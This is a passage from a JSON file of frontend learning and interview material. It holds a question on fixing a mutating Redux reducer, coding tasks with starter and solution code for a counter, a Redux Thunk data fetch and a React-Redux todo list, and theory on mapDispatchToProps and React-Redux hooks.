          "question": "Identify the error(s) in the following Redux reducer and rewrite it to ensure it's a pure function and maintains immutability. Explain why the original code is problematic.\n\n```typescript\ninterface Todo { id: number; text: string; completed: boolean; }\ninterface State { todos: Todo[]; lastAction: string; }\n\nconst initialState: State = {\n  todos: [],\n  lastAction: 'INIT'\n};\n\nfunction buggyTodoReducer(state = initialState, action: any): State {\n  switch (action.type) {\n    case 'ADD_TODO':\n      state.todos.push({ id: Date.now(), text: action.payload, completed: false });\n      state.lastAction = 'ADD_TODO';\n      return state;\n    case 'REMOVE_TODO':\n      state.todos = state.todos.filter(todo => todo.id !== action.payload.id);\n      return state;\n    case 'SET_LAST_ACTION':\n      state.lastAction = action.payload;\n      return state;\n    default:\n      return state;\n  }\n}\n```",
          "answer": "The `buggyTodoReducer` violates Redux principles by mutating the state directly. Reducers must be pure functions and always return new state objects instead of modifying the existing one.\n\n**Problems in `buggyTodoReducer`:**\n1.  **`ADD_TODO`**: `state.todos.push()` directly mutates the `todos` array. It also directly mutates `state.lastAction`.\n2.  **`REMOVE_TODO`**: While `filter` returns a new array, the line `state.todos = ...` still mutates the `state` object's `todos` property directly. The `lastAction` is also not updated.\n3.  **`SET_LAST_ACTION`**: `state.lastAction = ...` directly mutates a property of the `state` object.\n\n**Corrected Reducer:**\n```typescript\ninterface Todo { id: number; text: string; completed: boolean; }\ninterface State { todos: Todo[]; lastAction: string; }\n\nconst initialState: State = {\n  todos: [],\n  lastAction: 'INIT'\n};\n\nfunction correctedTodoReducer(state = initialState, action: any): State {\n  switch (action.type) {\n    case 'ADD_TODO':\n      return {\n        ...state, // Spread existing state to preserve other properties\n        todos: [...state.todos, { id: Date.now(), text: action.payload, completed: false }], // Return new array\n        lastAction: 'ADD_TODO' // Update lastAction immutably\n      };\n    case 'REMOVE_TODO':\n      return {\n        ...state,\n        todos: state.todos.filter(todo => todo.id !== action.payload.id),\n        lastAction: 'REMOVE_TODO' // Assuming this action also updates lastAction\n      };\n    case 'SET_LAST_ACTION':\n      return {\n        ...state,\n        lastAction: action.payload\n      };\n    default:\n      return state;\n  }\n}\n```\n\n**Explanation of Correction:**\nIn the `correctedTodoReducer`, instead of directly modifying `state` or its nested properties, we always return a *new* state object. The spread operator (`...`) is used to copy existing properties of `state` and its nested arrays/objects, ensuring that only the changed parts are updated in a new object. This maintains immutability, which is critical for Redux's predictability, performance optimizations (like `shouldComponentUpdate`), and time-travel debugging.",
          "options": [],
          "analysisPoints": [
            "Identifies direct state mutation as the core problem.",
            "Explains why `push` and direct assignment are problematic.",
            "Demonstrates correct immutable updates using spread syntax for objects and arrays.",
            "Ensures all relevant parts of the state are updated immutably.",
            "Provides a clear explanation of the 'why' behind immutability."
          ],
          "keyConcepts": [
            "Reducers",
            "Immutability",
            "Pure Functions",
            "State Mutation",
            "Spread Syntax"
          ],
          "evaluationCriteria": [
            "Accurate identification of mutation errors.",
            "Correct implementation of immutable state updates.",
            "Clear and concise explanation of the principles."
          ],
          "example": "",
          "tags": [
            "Redux",
            "Reducers",
            "Immutability",
            "Pure Functions",
            "Coding",
            "Hard"
          ],
          "prerequisites": [
            "Redux Core Concepts",
            "JavaScript Immutability"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_redux_core_implementation",
          "title": "Build a Simple Redux Counter Application",
          "description": "\nImplement a basic Redux application that manages a counter. Your solution should demonstrate the core Redux concepts:\n\n1.  **Actions**: Define action types for 'INCREMENT', 'DECREMENT', and 'RESET'.\n2.  **Action Creators**: Create action creator functions for each action type.\n3.  **Reducer**: Implement a pure reducer function that handles these actions and updates the counter state immutably.\n4.  **Store**: Create a Redux store using your reducer.\n5.  **Dispatch**: Dispatch actions to the store and observe the state changes.\n\nYour code should be plain JavaScript/TypeScript, without a UI framework like React.\n",
          "difficulty": "easy",
          "startingCode": "import { createStore } from 'redux';\n\n// 1. Define Action Types\nconst INCREMENT = 'INCREMENT';\nconst DECREMENT = 'DECREMENT';\nconst RESET = 'RESET';\n\n// 2. Action Creators\nfunction increment() {\n  // TODO: Return an INCREMENT action object\n  return {};\n}\n\nfunction decrement() {\n  // TODO: Return a DECREMENT action object\n  return {};\n}\n\nfunction reset() {\n  // TODO: Return a RESET action object\n  return {};\n}\n\n// 3. Reducer\n// Initial state for the counter\nconst initialState = { count: 0 };\n\nfunction counterReducer(state = initialState, action) {\n  switch (action.type) {\n    // TODO: Implement state updates for INCREMENT, DECREMENT, RESET\n    default:\n      return state;\n  }\n}\n\n// 4. Create Store\nconst store = createStore(counterReducer);\n\n// 5. Dispatch Actions and Log State\nconsole.log('Initial state:', store.getState());\n\n// TODO: Dispatch increment action and log state\n// TODO: Dispatch decrement action and log state\n// TODO: Dispatch reset action and log state\n",
          "solutionCode": "import { createStore } from 'redux';\n\n// 1. Define Action Types\nconst INCREMENT = 'INCREMENT';\nconst DECREMENT = 'DECREMENT';\nconst RESET = 'RESET';\n\n// 2. Action Creators\nfunction increment() {\n  return { type: INCREMENT };\n}\n\nfunction decrement() {\n  return { type: DECREMENT };\n}\n\nfunction reset() {\n  return { type: RESET };\n}\n\n// 3. Reducer\nconst initialState = { count: 0 };\n\nfunction counterReducer(state = initialState, action) {\n  switch (action.type) {\n    case INCREMENT:\n      return { ...state, count: state.count + 1 };\n    case DECREMENT:\n      return { ...state, count: state.count - 1 };\n    case RESET:\n      return { ...state, count: 0 };\n    default:\n      return state;\n  }\n}\n\n// 4. Create Store\nconst store = createStore(counterReducer);\n\n// 5. Dispatch Actions and Log State\nconsole.log('Initial state:', store.getState()); // { count: 0 }\n\nstore.dispatch(increment());\nconsole.log('After increment:', store.getState()); // { count: 1 }\n\nstore.dispatch(increment());\nconsole.log('After second increment:', store.getState()); // { count: 2 }\n\nstore.dispatch(decrement());\nconsole.log('After decrement:', store.getState()); // { count: 1 }\n\nstore.dispatch(reset());\nconsole.log('After reset:', store.getState()); // { count: 0 }\n\nstore.dispatch({ type: 'UNKNOWN_ACTION' });\nconsole.log('After unknown action:', store.getState()); // { count: 0 } (state remains unchanged)\n",
          "testCases": [
            "Initial state should be { count: 0 }.",
            "Dispatching 'INCREMENT' should increase count by 1.",
            "Dispatching 'DECREMENT' should decrease count by 1.",
            "Dispatching 'RESET' should set count to 0.",
            "Dispatching an unknown action type should not change the state.",
            "Ensure state immutability in reducer: new objects should be returned for changes."
          ],
          "hints": [
            "Remember to use the spread operator (`...`) to return new state objects in the reducer, ensuring immutability.",
            "Action creators should simply return a plain JavaScript object with a `type` property.",
            "The reducer's `default` case is crucial for returning the current state if the action type is not recognized."
          ],
          "tags": [
            "Redux",
            "Core Concepts",
            "Counter",
            "State Management",
            "Beginner"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "JavaScript Basics",
            "Redux Core Concepts"
          ],
          "complexity": 4,
          "interviewRelevance": 7,
          "learningPath": "beginner",
          "relatedConcepts": [
            "Actions",
            "Reducers",
            "Store",
            "Dispatch",
            "Immutability"
          ]
        },
        {
          "id": "task_redux_async_thunk_integration",
          "title": "Implement Asynchronous User Data Fetch with Redux Thunk",
          "description": "\nExtend a Redux application to handle fetching user data asynchronously using Redux Thunk middleware and the `REQUEST/SUCCESS/FAILURE` action pattern.\n\nYour task is to:\n1.  Define three action types: `FETCH_USER_REQUEST`, `FETCH_USER_SUCCESS`, `FETCH_USER_FAILURE`.\n2.  Create corresponding action creators for these types.\n3.  Implement a `userReducer` that manages the `user` state, including `data`, `loading`, and `error` properties, reacting to the async actions.\n4.  Develop a Redux Thunk action creator (`fetchUser`) that simulates an API call (e.g., using `setTimeout` or a mock `fetch`) and dispatches the appropriate `REQUEST`, `SUCCESS`, or `FAILURE` actions.\n5.  Configure your Redux store to use `redux-thunk` middleware.\n6.  Dispatch the `fetchUser` thunk and log the state at different stages to observe the flow.\n",
          "difficulty": "medium",
          "startingCode": "import { createStore, applyMiddleware, combineReducers } from 'redux';\nimport { thunk } from 'redux-thunk'; // Remember to install redux-thunk\n\n// 1. Define Action Types\nconst FETCH_USER_REQUEST = 'FETCH_USER_REQUEST';\nconst FETCH_USER_SUCCESS = 'FETCH_USER_SUCCESS';\nconst FETCH_USER_FAILURE = 'FETCH_USER_FAILURE';\n\n// 2. Action Creators\nconst fetchUserRequest = () => ({ type: FETCH_USER_REQUEST });\nconst fetchUserSuccess = (data) => ({ type: FETCH_USER_SUCCESS, payload: data });\nconst fetchUserFailure = (error) => ({ type: FETCH_USER_FAILURE, payload: error });\n\n// 3. User Reducer\nconst initialUserState = {\n  data: null,\n  loading: false,\n  error: null,\n};\n\nfunction userReducer(state = initialUserState, action) {\n  switch (action.type) {\n    // TODO: Handle FETCH_USER_REQUEST, FETCH_USER_SUCCESS, FETCH_USER_FAILURE\n    default:\n      return state;\n  }\n}\n\n// Combine reducers (if you had more state slices)\nconst rootReducer = combineReducers({\n  user: userReducer,\n});\n\n// 4. Redux Thunk Action Creator\nfunction fetchUser(userId) {\n  return async (dispatch) => {\n    // TODO: Dispatch request action\n    // TODO: Simulate API call (e.g., with setTimeout) and handle success/failure\n    // TODO: Dispatch success action with mock data or failure action with error\n  };\n}\n\n// 5. Create Store with Thunk Middleware\nconst store = createStore(\n  rootReducer,\n  applyMiddleware(thunk)\n);\n\n// 6. Dispatch the thunk and observe state changes\nconsole.log('Initial state:', store.getState());\n\nstore.dispatch(fetchUser(1)); // Fetch user with ID 1\nconsole.log('State after dispatching fetchUser (request phase):', store.getState());\n\n// You might need a setTimeout here to observe the eventual success/failure state\nsetTimeout(() => {\n  console.log('State after simulated API call completion:', store.getState());\n}, 1500); // Adjust timeout based on your mock API delay\n",
          "solutionCode": "import { createStore, applyMiddleware, combineReducers } from 'redux';\nimport { thunk } from 'redux-thunk';\n\n// 1. Define Action Types\nconst FETCH_USER_REQUEST = 'FETCH_USER_REQUEST';\nconst FETCH_USER_SUCCESS = 'FETCH_USER_SUCCESS';\nconst FETCH_USER_FAILURE = 'FETCH_USER_FAILURE';\n\n// 2. Action Creators\nconst fetchUserRequest = () => ({ type: FETCH_USER_REQUEST });\nconst fetchUserSuccess = (data) => ({ type: FETCH_USER_SUCCESS, payload: data });\nconst fetchUserFailure = (error) => ({ type: FETCH_USER_FAILURE, payload: error });\n\n// 3. User Reducer\nconst initialUserState = {\n  data: null,\n  loading: false,\n  error: null,\n};\n\nfunction userReducer(state = initialUserState, action) {\n  switch (action.type) {\n    case FETCH_USER_REQUEST:\n      return { ...state, loading: true, error: null };\n    case FETCH_USER_SUCCESS:\n      return { ...state, loading: false, data: action.payload, error: null };\n    case FETCH_USER_FAILURE:\n      return { ...state, loading: false, data: null, error: action.payload };\n    default:\n      return state;\n  }\n}\n\n// Combine reducers\nconst rootReducer = combineReducers({\n  user: userReducer,\n});\n\n// Mock API function\nconst mockApi = {\n  fetchUser: (userId) => {\n    return new Promise((resolve, reject) => {\n      setTimeout(() => {\n        if (userId === 1) {\n          resolve({ id: 1, name: 'John Doe', email: 'john@example.com' });\n        } else if (userId === 2) {\n          reject(new Error('User not found'));\n        } else {\n          reject(new Error('Invalid user ID'));\n        }\n      }, 1000); // Simulate network delay\n    });\n  },\n};\n\n// 4. Redux Thunk Action Creator\nfunction fetchUser(userId) {\n  return async (dispatch) => {\n    dispatch(fetchUserRequest()); // Dispatch request action\n    try {\n      const userData = await mockApi.fetchUser(userId);\n      dispatch(fetchUserSuccess(userData)); // Dispatch success action\n    } catch (error) {\n      dispatch(fetchUserFailure(error.message)); // Dispatch failure action\n    }\n  };\n}\n\n// 5. Create Store with Thunk Middleware\nconst store = createStore(\n  rootReducer,\n  applyMiddleware(thunk)\n);\n\n// 6. Dispatch the thunk and observe state changes\nconsole.log('Initial state:', store.getState());\n\n// --- Test Case 1: Successful Fetch ---\nconsole.log('\\n--- Fetching User 1 (Success) ---');\nstore.dispatch(fetchUser(1));\nconsole.log('State after dispatching fetchUser(1) (request phase):', store.getState());\nsetTimeout(() => {\n  console.log('State after simulated API call completion (User 1):', store.getState());\n}, 1200); \n\n// --- Test Case 2: Failed Fetch ---\nsetTimeout(() => {\n  console.log('\\n--- Fetching User 2 (Failure) ---');\n  store.dispatch(fetchUser(2));\n  console.log('State after dispatching fetchUser(2) (request phase):', store.getState());\n}, 2000); // Delay to ensure previous fetch completes\n\nsetTimeout(() => {\n  console.log('State after simulated API call completion (User 2):', store.getState());\n}, 3200);\n",
          "testCases": [
            "Initial `user` state should have `data: null`, `loading: false`, `error: null`.",
            "After dispatching `fetchUser(1)` (successful mock call): `loading` should be `true` immediately.",
            "After `fetchUser(1)` completes successfully: `loading` should be `false`, `data` should contain user object, `error` should be `null`.",
            "After dispatching `fetchUser(2)` (failed mock call): `loading` should be `true` immediately.",
            "After `fetchUser(2)` completes with an error: `loading` should be `false`, `data` should be `null`, `error` should contain the error message.",
            "Reducer should update state immutably for all action types.",
            "The thunk function should receive `dispatch` as an argument and use it to dispatch actions."
          ],
          "hints": [
            "Remember that Redux Thunk action creators return a *function* that receives `dispatch` (and optionally `getState`).",
            "Use `try...catch` block within your thunk to handle successful API responses and errors.",
            "Ensure your reducer copies the existing state and only updates the relevant properties for each action, maintaining immutability (e.g., using `...state`).",
            "A simple `setTimeout` wrapped in a `Promise` can simulate an asynchronous API call for testing purposes."
          ],
          "tags": [
            "Redux",
            "Redux Thunk",
            "Asynchronous",
            "API Integration",
            "Middleware",
            "State Management"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "Redux Core Concepts",
            "JavaScript Promises & Async/Await",
            "Redux Middleware Theory"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Redux Data Flow",
            "ACTION_REQUEST/SUCCESS/FAILURE",
            "Immutability"
          ]
        },
        {
          "id": "task_react_redux_integration",
          "title": "Build a React-Redux Todo List with Connect and Hooks",
          "description": "\nCreate a simple Todo list application using React and Redux, demonstrating both the `connect` HOC (for a class component) and `useSelector`/`useDispatch` hooks (for a functional component).\n\n**Requirements:**\n1.  **Redux Store Setup**: Define action types (`ADD_TODO`, `TOGGLE_TODO`), action creators, and a `todosReducer` to manage a list of todo objects (`{ id, text, completed }`). Create a Redux store.\n2.  **`App` Component (`Provider`)**: Wrap your main `App` component with `<Provider>` to make the Redux store available.\n3.  **Class Component (`connect`)**: Create a `TodoListClass` component that uses `connect` to:\n    *   Map `todos` state to props using `mapStateToProps`.\n    *   Map `addTodo` and `toggleTodo` action creators to props using `mapDispatchToProps` (using the object shorthand).\n    *   Render the list of todos and allow adding new ones and toggling completion status.\n4.  **Functional Component (`useSelector`, `useDispatch`)**: Create a `TodoListFunctional` component that uses `useSelector` to get `todos` and `useDispatch` to dispatch `addTodo` and `toggleTodo` actions.\n    *   Render the list of todos and allow adding new ones and toggling completion status.\n5.  **Basic Styling**: Add minimal inline or CSS module styling to differentiate completed todos.\n\n**Bonus**: Add a 'Filter Todos' feature (e.g., 'All', 'Completed', 'Active') controlled by the Redux state, demonstrated in either component type.\n",
          "difficulty": "medium",
          "startingCode": "import React from 'react';\nimport ReactDOM from 'react-dom/client';\nimport { createStore, combineReducers } from 'redux';\nimport { Provider, connect, useSelector, useDispatch } from 'react-redux';\n\n// --- Redux Setup ---\n\n// Action Types\nconst ADD_TODO = 'ADD_TODO';\nconst TOGGLE_TODO = 'TOGGLE_TODO';\n\n// Action Creators\nlet nextTodoId = 0;\nconst addTodo = (text) => ({\n  type: ADD_TODO,\n  payload: { id: nextTodoId++, text, completed: false },\n});\nconst toggleTodo = (id) => ({\n  type: TOGGLE_TODO,\n  payload: { id },\n});\n\n// Reducer\nconst todosReducer = (state = [], action) => {\n  switch (action.type) {\n    case ADD_TODO:\n      return [...state, action.payload];\n    case TOGGLE_TODO:\n      return state.map((todo) =>\n        todo.id === action.payload.id ? { ...todo, completed: !todo.completed } : todo\n      );\n    default:\n      return state;\n  }\n};\n\nconst rootReducer = combineReducers({\n  todos: todosReducer,\n});\n\nconst store = createStore(rootReducer);\n\n// --- React Components ---\n\n// 3. Class Component with `connect`\nclass TodoListClass extends React.Component {\n  render() {\n    const { todos, addTodo, toggleTodo } = this.props; // Props received from connect\n\n    return (\n      <div>\n        <h2>Class Component Todo List</h2>\n        <input\n          type=\"text\"\n          placeholder=\"Add a todo\"\n          onKeyPress={(e) => {\n            if (e.key === 'Enter') {\n              addTodo(e.target.value);\n              e.target.value = '';\n            }\n          }}\n        />\n        <ul>\n          {todos.map((todo) => (\n            <li\n              key={todo.id}\n              onClick={() => toggleTodo(todo.id)}\n              style={{ textDecoration: todo.completed ? 'line-through' : 'none', cursor: 'pointer' }}\n            >\n              {todo.text}\n            </li>\n          ))}\n        </ul>\n      </div>\n    );\n  }\n}\n\nconst mapStateToPropsClass = (state) => ({ todos: state.todos });\nconst mapDispatchToPropsClass = { addTodo, toggleTodo }; // Object shorthand\n\nconst ConnectedTodoListClass = connect(mapStateToPropsClass, mapDispatchToPropsClass)(TodoListClass);\n\n// 4. Functional Component with Hooks\nfunction TodoListFunctional() {\n  const todos = useSelector((state) => state.todos);\n  const dispatch = useDispatch();\n\n  const handleAddTodo = (e) => {\n    if (e.key === 'Enter') {\n      dispatch(addTodo(e.target.value));\n      e.target.value = '';\n    }\n  };\n\n  const handleToggleTodo = (id) => {\n    dispatch(toggleTodo(id));\n  };\n\n  return (\n    <div>\n      <h2>Functional Component Todo List</h2>\n      <input\n        type=\"text\"\n        placeholder=\"Add a todo\"\n        onKeyPress={handleAddTodo}\n      />\n      <ul>\n        {todos.map((todo) => (\n          <li\n            key={todo.id}\n            onClick={() => handleToggleTodo(todo.id)}\n            style={{ textDecoration: todo.completed ? 'line-through' : 'none', cursor: 'pointer' }}\n          >\n            {todo.text}\n          </li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n\n// 2. App Component (`Provider`)\nfunction App() {\n  return (\n    <div>\n      <h1>React Redux Todo App</h1>\n      <ConnectedTodoListClass />\n      <TodoListFunctional />\n    </div>\n  );\n}\n\nconst root = ReactDOM.createRoot(document.getElementById('root'));\nroot.render(\n  <Provider store={store}>\n    <App />\n  </Provider>\n);\n",
          "solutionCode": "import React from 'react';\nimport ReactDOM from 'react-dom/client';\nimport { createStore, combineReducers } from 'redux';\nimport { Provider, connect, useSelector, useDispatch } from 'react-redux';\n\n// --- Redux Setup ---\n\n// Action Types\nconst ADD_TODO = 'ADD_TODO';\nconst TOGGLE_TODO = 'TOGGLE_TODO';\nconst SET_VISIBILITY_FILTER = 'SET_VISIBILITY_FILTER'; // For bonus task\n\n// Action Creators\nlet nextTodoId = 0;\nconst addTodo = (text) => ({\n  type: ADD_TODO,\n  payload: { id: nextTodoId++, text, completed: false },\n});\nconst toggleTodo = (id) => ({\n  type: TOGGLE_TODO,\n  payload: { id },\n});\nconst setVisibilityFilter = (filter) => ({\n  type: SET_VISIBILITY_FILTER,\n  payload: { filter },\n});\n\n// Reducers\nconst todosReducer = (state = [], action) => {\n  switch (action.type) {\n    case ADD_TODO:\n      return [...state, action.payload];\n    case TOGGLE_TODO:\n      return state.map((todo) =>\n        todo.id === action.payload.id ? { ...todo, completed: !todo.completed } : todo\n      );\n    default:\n      return state;\n  }\n};\n\nconst visibilityFilterReducer = (state = 'SHOW_ALL', action) => {\n  switch (action.type) {\n    case SET_VISIBILITY_FILTER:\n      return action.payload.filter;\n    default:\n      return state;\n  }\n};\n\nconst rootReducer = combineReducers({\n  todos: todosReducer,\n  visibilityFilter: visibilityFilterReducer, // For bonus task\n});\n\nconst store = createStore(rootReducer);\n\n// --- React Components ---\n\n// Selector for filtered todos (for bonus task)\nconst getVisibleTodos = (todos, filter) => {\n  switch (filter) {\n    case 'SHOW_ALL':\n      return todos;\n    case 'SHOW_COMPLETED':\n      return todos.filter((t) => t.completed);\n    case 'SHOW_ACTIVE':\n      return todos.filter((t) => !t.completed);\n    default:\n      throw new Error('Unknown filter: ' + filter);\n  }\n};\n\n// 3. Class Component with `connect`\nclass TodoListClass extends React.Component<any> {\n  render() {\n    const { todos, visibilityFilter, addTodo, toggleTodo, setVisibilityFilter } = this.props; \n    const visibleTodos = getVisibleTodos(todos, visibilityFilter);\n\n    return (\n      <div style={{ border: '1px solid #ccc', padding: '15px', margin: '10px', borderRadius: '8px' }}>\n        <h2>Class Component Todo List</h2>\n        <input\n          type=\"text\"\n          placeholder=\"Add a todo\"\n          onKeyPress={(e) => {\n            if (e.key === 'Enter') {\n              addTodo((e.target as HTMLInputElement).value);\n              (e.target as HTMLInputElement).value = '';\n            }\n          }}\n        />\n        <ul>\n          {visibleTodos.map((todo) => (\n            <li\n              key={todo.id}\n              onClick={() => toggleTodo(todo.id)}\n              style={{ textDecoration: todo.completed ? 'line-through' : 'none', cursor: 'pointer' }}\n            >\n              {todo.text}\n            </li>\n          ))}\n        </ul>\n        <div style={{ marginTop: '10px' }}>\n          Show:\n          <button onClick={() => setVisibilityFilter('SHOW_ALL')} style={{ marginLeft: '5px', fontWeight: visibilityFilter === 'SHOW_ALL' ? 'bold' : 'normal' }}>All</button>\n          <button onClick={() => setVisibilityFilter('SHOW_ACTIVE')} style={{ marginLeft: '5px', fontWeight: visibilityFilter === 'SHOW_ACTIVE' ? 'bold' : 'normal' }}>Active</button>\n          <button onClick={() => setVisibilityFilter('SHOW_COMPLETED')} style={{ marginLeft: '5px', fontWeight: visibilityFilter === 'SHOW_COMPLETED' ? 'bold' : 'normal' }}>Completed</button>\n        </div>\n      </div>\n    );\n  }\n}\n\nconst mapStateToPropsClass = (state: any) => ({\n  todos: state.todos,\n  visibilityFilter: state.visibilityFilter,\n});\nconst mapDispatchToPropsClass = { addTodo, toggleTodo, setVisibilityFilter }; \n\nconst ConnectedTodoListClass = connect(mapStateToPropsClass, mapDispatchToPropsClass)(TodoListClass);\n\n// 4. Functional Component with Hooks\nfunction TodoListFunctional() {\n  const todos = useSelector((state: any) => state.todos);\n  const visibilityFilter = useSelector((state: any) => state.visibilityFilter);\n  const dispatch = useDispatch();\n\n  const visibleTodos = getVisibleTodos(todos, visibilityFilter);\n\n  const handleAddTodo = (e: React.KeyboardEvent<HTMLInputElement>) => {\n    if (e.key === 'Enter') {\n      dispatch(addTodo((e.target as HTMLInputElement).value));\n      (e.target as HTMLInputElement).value = '';\n    }\n  };\n\n  const handleToggleTodo = (id: number) => {\n    dispatch(toggleTodo(id));\n  };\n\n  const handleSetFilter = (filter: string) => {\n    dispatch(setVisibilityFilter(filter));\n  };\n\n  return (\n    <div style={{ border: '1px solid #ccc', padding: '15px', margin: '10px', borderRadius: '8px' }}>\n      <h2>Functional Component Todo List</h2>\n      <input\n        type=\"text\"\n        placeholder=\"Add a todo\"\n        onKeyPress={handleAddTodo}\n      />\n      <ul>\n        {visibleTodos.map((todo) => (\n          <li\n            key={todo.id}\n            onClick={() => handleToggleTodo(todo.id)}\n            style={{ textDecoration: todo.completed ? 'line-through' : 'none', cursor: 'pointer' }}\n          >\n            {todo.text}\n          </li>\n        ))}\n      </ul>\n      <div style={{ marginTop: '10px' }}>\n        Show:\n        <button onClick={() => handleSetFilter('SHOW_ALL')} style={{ marginLeft: '5px', fontWeight: visibilityFilter === 'SHOW_ALL' ? 'bold' : 'normal' }}>All</button>\n        <button onClick={() => handleSetFilter('SHOW_ACTIVE')} style={{ marginLeft: '5px', fontWeight: visibilityFilter === 'SHOW_ACTIVE' ? 'bold' : 'normal' }}>Active</button>\n        <button onClick={() => handleSetFilter('SHOW_COMPLETED')} style={{ marginLeft: '5px', fontWeight: visibilityFilter === 'SHOW_COMPLETED' ? 'bold' : 'normal' }}>Completed</button>\n      </div>\n    </div>\n  );\n}\n\n// 2. App Component (`Provider`)\nfunction App() {\n  return (\n    <div style={{ fontFamily: 'Arial, sans-serif', maxWidth: '800px', margin: '20px auto', padding: '20px', border: '1px solid #eee', borderRadius: '10px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)' }}>\n      <h1 style={{ textAlign: 'center', color: '#333' }}>React Redux Todo App</h1>\n      <ConnectedTodoListClass />\n      <TodoListFunctional />\n    </div>\n  );\n}\n\nconst root = ReactDOM.createRoot(document.getElementById('root') as HTMLElement);\nroot.render(\n  <Provider store={store}>\n    <App />\n  </Provider>\n);\n",
          "testCases": [
            "Adding a todo via either component should add it to the Redux state and appear in both components.",
            "Toggling a todo's completion status via either component should update its state and reflect in both components.",
            "Both `TodoListClass` and `TodoListFunctional` components should render correctly.",
            "The class component should receive `todos`, `addTodo`, and `toggleTodo` via props from `connect`.",
            "The functional component should use `useSelector` to get `todos` and `useDispatch` to dispatch actions.",
            "**Bonus**: Filtering by 'All', 'Completed', or 'Active' should correctly display only the relevant todos in both components."
          ],
          "hints": [
            "Remember to wrap your root React component with the `<Provider store={store}>`.",
            "For `connect`, `mapStateToProps` should return an object mapping Redux state slices to component props. `mapDispatchToProps` (object shorthand) should be an object mapping action creators to component props.",
            "For functional components, `useSelector` takes a function to extract data from state, and `useDispatch` returns the `dispatch` function itself.",
            "Ensure your `todosReducer` handles immutability correctly when adding or toggling todos."
          ],
          "tags": [
            "React",
            "Redux",
            "React-Redux",
            "Hooks",
            "connect",
            "State Management",
            "UI"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "React Fundamentals",
            "Redux Core Concepts",
            "JavaScript Immutability"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Redux Data Flow",
            "Component Lifecycle",
            "Hooks vs HOCs"
          ]
        }
      ]
    }
  },
  {
    "id": "0763bedd-5fe3-467b-a8f8-4ead965fd59e",
    "startLine": 13700,
    "endLine": 13799,
    "processedDate": "2025-06-17T13:35:53.045Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_redux_dispatch_hooks",
          "title": "Redux Action Dispatching: `mapDispatchToProps` and React Hooks",
          "content": "Connecting React components to a Redux store often involves dispatching actions to update the state. Redux provides several patterns for this, including `mapDispatchToProps` for class components (or functional components using `connect`) and dedicated hooks for functional components.\n\n### `mapDispatchToProps` Patterns (with `connect`)\n`mapDispatchToProps` is an optional second argument to Redux's `connect` function. It's a function that receives the `dispatch` method as its first argument and returns an object. The keys of this object will become props passed to your component, and their values should be functions that dispatch Redux actions.\n\nThere are three common ways to define `mapDispatchToProps`:\n\n#### 1. Manually Wrapping Action Creators\nIn this approach, you explicitly define functions that call `dispatch` with the result of your action creators. This gives you full control over how actions are dispatched, including adding middleware logic or specific payload transformations before dispatching.\n\n```typescript\nimport { connect } from 'react-redux';\nimport { addTodo, toggleTodo } from './actions'; // Assuming these are defined elsewhere\n\nconst mapDispatchToProps = (dispatch) => ({\n  addTodo: (text) => dispatch(addTodo(text)),\n  toggleTodo: (id) => dispatch(toggleTodo(id))\n});\n```\n\n#### 2. Using `bindActionCreators`\nThe `bindActionCreators` utility from Redux can be used to automatically wrap action creators in `dispatch` calls. This is useful when you have many action creators and want to avoid manually writing `dispatch(actionCreator(...))` for each one. It takes an object or a function of action creators and the `dispatch` function, returning an object with the same keys but with values wrapped in `dispatch` calls.\n\n```typescript\nimport { bindActionCreators } from 'redux';\nimport { connect } from 'react-redux';\nimport { addTodo, toggleTodo } from './actions';\n\nconst mapDispatchToProps = (dispatch) => ({\n  ...bindActionCreators({ addTodo, toggleTodo }, dispatch)\n});\n```\n\n#### 3. Object Shorthand (Recommended)\nThis is the simplest and most common approach. When you provide an object of action creators directly to `connect` as the `mapDispatchToProps` argument, Redux automatically wraps each action creator in a `dispatch` call for you. This abstracts away the `dispatch` logic entirely, making the code cleaner and more concise.\n\n```typescript\nimport { connect } from 'react-redux';\nimport { addTodo, toggleTodo } from './actions';\n\n// Redux's connect automatically wraps these in dispatch calls\nconst mapDispatchToProps = { addTodo, toggleTodo };\n\n// Usage with connect:\n// export default connect(mapStateToProps, mapDispatchToProps)(MyComponent);\n```\n\nThe third option is generally recommended due to its simplicity and conciseness, reducing boilerplate code.\n\n### Using Redux Hooks with Functional Components\nReact-Redux provides hooks (`useSelector`, `useDispatch`, `useStore`) which are the modern way to interact with the Redux store in functional components, eliminating the need for `connect` for most use cases.\n\n#### `useSelector`\nThe `useSelector` hook allows you to extract data from the Redux store state. It takes a `selector` function as an argument, which receives the entire Redux state as an argument and returns the piece of state you need. `useSelector` automatically subscribes your component to the store, and will re-render your component if the selected state changes.\n\n#### `useDispatch`\nThe `useDispatch` hook returns a reference to the `dispatch` function from the Redux store. You can then use this `dispatch` function to dispatch actions directly from your functional component. This is the equivalent of getting `dispatch` via `mapDispatchToProps` but without the `connect` HOC.\n\n```typescript\nimport { useSelector, useDispatch } from 'react-redux';\nimport { addTodo } from './actions';\n\nfunction TodoList() {\n  // Extracting todos from the state using useSelector\n  const todos = useSelector(state => state.todos);\n  \n  // Getting the dispatch function using useDispatch\n  const dispatch = useDispatch();\n  \n  // Defining a handler to dispatch an action\n  const addNewTodo = (text) => {\n    dispatch(addTodo(text));\n  };\n  \n  return (\n    <div>\n      {/* Render todos */}\n      {todos.map(todo => <div key={todo.id}>{todo.text}</div>)}\n      <button onClick={() => addNewTodo('New Task')}>Add Todo</button>\n    </div>\n  );\n}\n```\n\nUsing hooks often leads to more readable and concise code for Redux integration in functional components."
        },
        {
          "id": "theory_css_fundamentals",
          "title": "Fundamental CSS Concepts: Box Model, Positioning, Display, Preprocessors, and Specificity",
